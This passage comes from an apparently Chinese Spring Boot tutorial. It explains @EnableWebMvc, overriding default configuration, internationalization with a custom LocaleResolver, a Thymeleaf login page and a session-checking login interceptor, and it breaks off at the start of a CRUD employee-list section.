id="3-全面接管springmvc">3、全面接管SpringMVC；</span></h3><p>SpringBoot对SpringMVC的自动配置不需要了，所有都是我们自己配置；所有的SpringMVC的自动配置都失效了</p><p><strong>我们需要在配置类中添加@EnableWebMvc即可；</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用WebMvcConfigurerAdapter可以来扩展SpringMVC的功能</span></span><br><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMvcConfig</span> <span class="keyword">extends</span> <span class="title">WebMvcConfigurerAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> </span>&#123;</span><br><span class="line">       <span class="comment">// super.addViewControllers(registry);</span></span><br><span class="line">        <span class="comment">//浏览器发送 /atguigu 请求来到 success</span></span><br><span class="line">        registry.addViewController(<span class="string">"/atguigu"</span>).setViewName(<span class="string">"success"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理：</p><p>为什么@EnableWebMvc自动配置就失效了；</p><p>1）@EnableWebMvc的核心</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Import</span>(DelegatingWebMvcConfiguration<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">public</span> @<span class="title">interface</span> <span class="title">EnableWebMvc</span> </span>&#123;</span><br></pre></td></tr></table></figure><p>2）、</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DelegatingWebMvcConfiguration</span> <span class="keyword">extends</span> <span class="title">WebMvcConfigurationSupport</span> </span>&#123;</span><br></pre></td></tr></table></figure><p>3）、</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnWebApplication</span></span><br><span class="line"><span class="meta">@ConditionalOnClass</span>(&#123; Servlet<span class="class">.<span class="keyword">class</span>, <span class="title">DispatcherServlet</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class"><span class="title">WebMvcConfigurerAdapter</span>.<span class="title">class</span> &#125;)</span></span><br><span class="line"><span class="class">//容器中没有这个组件的时候，这个自动配置类才生效</span></span><br><span class="line"><span class="class">@<span class="title">ConditionalOnMissingBean</span>(<span class="title">WebMvcConfigurationSupport</span>.<span class="title">class</span>)</span></span><br><span class="line"><span class="class">@<span class="title">AutoConfigureOrder</span>(<span class="title">Ordered</span>.<span class="title">HIGHEST_PRECEDENCE</span> + 10)</span></span><br><span class="line"><span class="class">@<span class="title">AutoConfigureAfter</span>(</span>&#123; DispatcherServletAutoConfiguration<span class="class">.<span class="keyword">class</span>,</span></span><br><span class="line"><span class="class"><span class="title">ValidationAutoConfiguration</span>.<span class="title">class</span> &#125;)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">WebMvcAutoConfiguration</span> </span>&#123;</span><br></pre></td></tr></table></figure><p>4）、@EnableWebMvc将WebMvcConfigurationSupport组件导入进来；</p><p>5）、导入的WebMvcConfigurationSupport只是SpringMVC最基本的功能；</p><h2><span id="5-如何修改springboot的默认配置">5、如何修改SpringBoot的默认配置</span></h2><p>模式：</p><p>​    1）、SpringBoot在自动配置很多组件的时候，先看容器中有没有用户自己配置的（@Bean、@Component）如果有就用用户配置的，如果没有，才自动配置；如果有些组件可以有多个（ViewResolver）将用户配置的和自己默认的组合起来；</p><p>​    2）、在SpringBoot中会有非常多的xxxConfigurer帮助我们进行扩展配置</p><p>​    3）、在SpringBoot中会有很多的xxxCustomizer帮助我们进行定制配置</p><h2><span id="6-restfulcrud">6、RestfulCRUD</span></h2><h3><span id="1-默认访问首页">1）、默认访问首页</span></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//使用WebMvcConfigurerAdapter可以来扩展SpringMVC的功能</span></span><br><span class="line"><span class="comment">//@EnableWebMvc   不要接管SpringMVC</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMvcConfig</span> <span class="keyword">extends</span> <span class="title">WebMvcConfigurerAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> </span>&#123;</span><br><span class="line">       <span class="comment">// super.addViewControllers(registry);</span></span><br><span class="line">        <span class="comment">//浏览器发送 /atguigu 请求来到 success</span></span><br><span class="line">        registry.addViewController(<span class="string">"/atguigu"</span>).setViewName(<span class="string">"success"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//所有的WebMvcConfigurerAdapter组件都会一起起作用</span></span><br><span class="line">    <span class="meta">@Bean</span> <span class="comment">//将组件注册在容器</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> WebMvcConfigurerAdapter <span class="title">webMvcConfigurerAdapter</span><span class="params">()</span></span>&#123;</span><br><span class="line">        WebMvcConfigurerAdapter adapter = <span class="keyword">new</span> WebMvcConfigurerAdapter() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> </span>&#123;</span><br><span class="line">                registry.addViewController(<span class="string">"/"</span>).setViewName(<span class="string">"login"</span>);</span><br><span class="line">                registry.addViewController(<span class="string">"/index.html"</span>).setViewName(<span class="string">"login"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> adapter;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="2-国际化">2）、国际化</span></h3><p><strong>1）、编写国际化配置文件；</strong></p><p>2）、使用ResourceBundleMessageSource管理国际化资源文件</p><p>3）、在页面使用fmt:message取出国际化内容</p><p>步骤：</p><p>1）、编写国际化配置文件，抽取页面需要显示的国际化消息</p><p><img src="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180211130721.png" alt></p><p>2）、SpringBoot自动配置好了管理国际化资源文件的组件；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties</span>(prefix = <span class="string">"spring.messages"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MessageSourceAutoConfiguration</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Comma-separated list of basenames (essentially a fully-qualified classpath</span></span><br><span class="line"><span class="comment"> * location), each following the ResourceBundle convention with relaxed support for</span></span><br><span class="line"><span class="comment"> * slash based locations. If it doesn't contain a package qualifier (such as</span></span><br><span class="line"><span class="comment"> * "org.mypackage"), it will be resolved from the classpath root.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> String basename = <span class="string">"messages"</span>;  </span><br><span class="line">    <span class="comment">//我们的配置文件可以直接放在类路径下叫messages.properties；</span></span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> MessageSource <span class="title">messageSource</span><span class="params">()</span> </span>&#123;</span><br><span class="line">ResourceBundleMessageSource messageSource = <span class="keyword">new</span> ResourceBundleMessageSource();</span><br><span class="line"><span class="keyword">if</span> (StringUtils.hasText(<span class="keyword">this</span>.basename)) &#123;</span><br><span class="line">            <span class="comment">//设置国际化资源文件的基础名（去掉语言国家代码的）</span></span><br><span class="line">messageSource.setBasenames(StringUtils.commaDelimitedListToStringArray(</span><br><span class="line">StringUtils.trimAllWhitespace(<span class="keyword">this</span>.basename)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.encoding != <span class="keyword">null</span>) &#123;</span><br><span class="line">messageSource.setDefaultEncoding(<span class="keyword">this</span>.encoding.name());</span><br><span class="line">&#125;</span><br><span class="line">messageSource.setFallbackToSystemLocale(<span class="keyword">this</span>.fallbackToSystemLocale);</span><br><span class="line">messageSource.setCacheSeconds(<span class="keyword">this</span>.cacheSeconds);</span><br><span class="line">messageSource.setAlwaysUseMessageFormat(<span class="keyword">this</span>.alwaysUseMessageFormat);</span><br><span class="line"><span class="keyword">return</span> messageSource;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3）、去页面获取国际化的值；</p><p><img src="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180211134506.png" alt></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>  <span class="attr">xmlns:th</span>=<span class="string">"http://www.thymeleaf.org"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"author"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Signin Template for Bootstrap<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Bootstrap core CSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"asserts/css/bootstrap.min.css"</span> <span class="attr">th:href</span>=<span class="string">"@&#123;/webjars/bootstrap/4.0.0/css/bootstrap.css&#125;"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Custom styles for this template --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"asserts/css/signin.css"</span> <span class="attr">th:href</span>=<span class="string">"@&#123;/asserts/css/signin.css&#125;"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-signin"</span> <span class="attr">action</span>=<span class="string">"dashboard.html"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">"mb-4"</span> <span class="attr">th:src</span>=<span class="string">"@&#123;/asserts/img/bootstrap-solid.svg&#125;"</span> <span class="attr">src</span>=<span class="string">"asserts/img/bootstrap-solid.svg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"72"</span> <span class="attr">height</span>=<span class="string">"72"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"h3 mb-3 font-weight-normal"</span> <span class="attr">th:text</span>=<span class="string">"#&#123;login.tip&#125;"</span>&gt;</span>Please sign in<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"sr-only"</span> <span class="attr">th:text</span>=<span class="string">"#&#123;login.username&#125;"</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"Username"</span> <span class="attr">th:placeholder</span>=<span class="string">"#&#123;login.username&#125;"</span> <span class="attr">required</span>=<span class="string">""</span> <span class="attr">autofocus</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"sr-only"</span> <span class="attr">th:text</span>=<span class="string">"#&#123;login.password&#125;"</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"Password"</span> <span class="attr">th:placeholder</span>=<span class="string">"#&#123;login.password&#125;"</span> <span class="attr">required</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"checkbox mb-3"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">value</span>=<span class="string">"remember-me"</span>/&gt;</span> [[#&#123;login.remember&#125;]]</span><br><span class="line">        <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-lg btn-primary btn-block"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">th:text</span>=<span class="string">"#&#123;login.btn&#125;"</span>&gt;</span>Sign in<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"mt-5 mb-3 text-muted"</span>&gt;</span>© 2017-2018<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn btn-sm"</span>&gt;</span>中文<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn btn-sm"</span>&gt;</span>English<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果：根据浏览器语言设置的信息切换了国际化；</p><p>原理：</p><p>​    国际化Locale（区域信息对象）；LocaleResolver（获取区域信息对象）；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean</span></span><br><span class="line"><span class="meta">@ConditionalOnProperty</span>(prefix = <span class="string">"spring.mvc"</span>, name = <span class="string">"locale"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> LocaleResolver <span class="title">localeResolver</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.mvcProperties</span><br><span class="line">.getLocaleResolver() == WebMvcProperties.LocaleResolver.FIXED) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> FixedLocaleResolver(<span class="keyword">this</span>.mvcProperties.getLocale());</span><br><span class="line">&#125;</span><br><span class="line">AcceptHeaderLocaleResolver localeResolver = <span class="keyword">new</span> AcceptHeaderLocaleResolver();</span><br><span class="line">localeResolver.setDefaultLocale(<span class="keyword">this</span>.mvcProperties.getLocale());</span><br><span class="line"><span class="keyword">return</span> localeResolver;</span><br><span class="line">&#125;</span><br><span class="line">默认的就是根据请求头带来的区域信息获取Locale进行国际化</span><br></pre></td></tr></table></figure><p>4）、点击链接切换国际化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 可以在连接上携带区域信息</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyLocaleResolver</span> <span class="keyword">implements</span> <span class="title">LocaleResolver</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Locale <span class="title">resolveLocale</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        String l = request.getParameter(<span class="string">"l"</span>);</span><br><span class="line">        Locale locale = Locale.getDefault();</span><br><span class="line">        <span class="keyword">if</span>(!StringUtils.isEmpty(l))&#123;</span><br><span class="line">            String[] split = l.split(<span class="string">"_"</span>);</span><br><span class="line">            locale = <span class="keyword">new</span> Locale(split[<span class="number">0</span>],split[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> locale;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLocale</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Locale locale)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> LocaleResolver <span class="title">localeResolver</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyLocaleResolver();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="3-登陆">3）、登陆</span></h3><p>开发期间模板引擎页面修改以后，要实时生效</p><p>1）、禁用模板引擎的缓存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 禁用缓存</span><br><span class="line">spring.thymeleaf.cache&#x3D;false</span><br></pre></td></tr></table></figure><p>2）、页面修改完成以后ctrl+f9：重新编译；</p><p>登陆错误消息的显示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: red"</span> <span class="attr">th:text</span>=<span class="string">"$&#123;msg&#125;"</span> <span class="attr">th:if</span>=<span class="string">"$&#123;not #strings.isEmpty(msg)&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h3><span id="4-拦截器进行登陆检查">4）、拦截器进行登陆检查</span></h3><p>拦截器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 登陆检查，</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginHandlerInterceptor</span> <span class="keyword">implements</span> <span class="title">HandlerInterceptor</span> </span>&#123;</span><br><span class="line">    <span class="comment">//目标方法执行之前</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Object user = request.getSession().getAttribute(<span class="string">"loginUser"</span>);</span><br><span class="line">        <span class="keyword">if</span>(user == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="comment">//未登陆，返回登陆页面</span></span><br><span class="line">            request.setAttribute(<span class="string">"msg"</span>,<span class="string">"没有权限请先登陆"</span>);</span><br><span class="line">            request.getRequestDispatcher(<span class="string">"/index.html"</span>).forward(request,response);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//已登陆，放行请求</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注册拦截器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//所有的WebMvcConfigurerAdapter组件都会一起起作用</span></span><br><span class="line">  <span class="meta">@Bean</span> <span class="comment">//将组件注册在容器</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> WebMvcConfigurerAdapter <span class="title">webMvcConfigurerAdapter</span><span class="params">()</span></span>&#123;</span><br><span class="line">      WebMvcConfigurerAdapter adapter = <span class="keyword">new</span> WebMvcConfigurerAdapter() &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> </span>&#123;</span><br><span class="line">              registry.addViewController(<span class="string">"/"</span>).setViewName(<span class="string">"login"</span>);</span><br><span class="line">              registry.addViewController(<span class="string">"/index.html"</span>).setViewName(<span class="string">"login"</span>);</span><br><span class="line">              registry.addViewController(<span class="string">"/main.html"</span>).setViewName(<span class="string">"dashboard"</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">//注册拦截器</span></span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> </span>&#123;</span><br><span class="line">              <span class="comment">//super.addInterceptors(registry);</span></span><br><span class="line">              <span class="comment">//静态资源；  *.css , *.js</span></span><br><span class="line">              <span class="comment">//SpringBoot已经做好了静态资源映射</span></span><br><span class="line">              registry.addInterceptor(<span class="keyword">new</span> LoginHandlerInterceptor()).addPathPatterns(<span class="string">"/**"</span>)</span><br><span class="line">                      .excludePathPatterns(<span class="string">"/index.html"</span>,<span class="string">"/"</span>,<span class="string">"/user/login"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="keyword">return</span> adapter;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3><span id="5-crud-员工列表">5）、CRUD-员工列表</span></h3><p>实验要求：</p><p>1）、RestfulCRUD：CRUD满足Rest风格；</p><p>URI：  /资源名称/资源标识       